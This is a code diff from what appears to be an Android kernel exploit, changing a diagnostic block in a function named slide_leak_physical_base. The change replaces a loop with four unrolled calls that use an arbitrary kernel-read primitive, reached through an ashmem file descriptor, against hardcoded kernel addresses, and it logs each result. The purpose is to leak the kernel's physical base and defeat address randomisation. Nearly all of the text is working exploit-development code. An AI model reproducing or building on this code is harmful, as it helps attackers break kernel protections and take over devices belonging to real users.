@@ -1112,31 +1112,43 @@ static int slide_leak_physical_base(void) {
     return 0;
   }
 
-      /* --- DIAG: test configfs primitive on known addresses --- */
+  /* --- DIAG: test configfs primitive on known addresses --- */
   {
     uint64_t val = 0;
     ssize_t ret;
-    uintptr_t test_addrs[] = {
-      0xffffff8080000000ULL,        /* direct map base */
-      0xffffff80801f0000ULL,        /* where probe starts */
-      slide_logger,                 /* known .data from profile */
-      0xffffff80016dce21ULL,        /* hardcoded slide_logger */
-    };
-    const char *names[] = {
-      "direct-map-base",
-      "probe-start",
-      "slide_logger",
-      "hardcoded-logger",
-    };
-    for (size_t i = 0; i < sizeof(test_addrs)/sizeof(test_addrs[0]); i++) {
-      ret = configfs_read_once(ashmem_fd, test_addrs[i], &val, sizeof(val));
-      pr_info("DIAG: name=%s addr=%016zx ret=%zd val=%016llx errno=%d\n",
-              names[i], test_addrs[i], ret,
-              (unsigned long long)val, errno);
-    }
+    unsigned long test_addr;
+    const char *name;
+
+    /* Test 1: direct map base */
+    test_addr = 0xffffff8080000000ULL;
+    name = "direct-map-base";
+    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
+    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
+            name, test_addr, ret, (unsigned long long)val, errno);
+
+    /* Test 2: probe start area */
+    test_addr = 0xffffff80801f0000ULL;
+    name = "probe-start";
+    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
+    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
+            name, test_addr, ret, (unsigned long long)val, errno);
+
+    /* Test 3: known .data symbol (slide_logger) */
+    test_addr = 0xffffff80016dce21ULL;
+    name = "slide-logger";
+    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
+    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
+            name, test_addr, ret, (unsigned long long)val, errno);
+
+    /* Test 4: another known .data symbol (bootid_data) */
+    test_addr = 0xffffff800243ef78ULL;
+    name = "bootid-data";
+    ret = configfs_read_once(ashmem_fd, test_addr, &val, sizeof(val));
+    pr_info("DIAG: name=%s addr=%016lx ret=%zd val=%016llx errno=%d\n",
+            name, test_addr, ret, (unsigned long long)val, errno);
   }
   /* --- END DIAG --- */
-  
+    
   for (size_t idx = 0;
        idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
        idx++) {
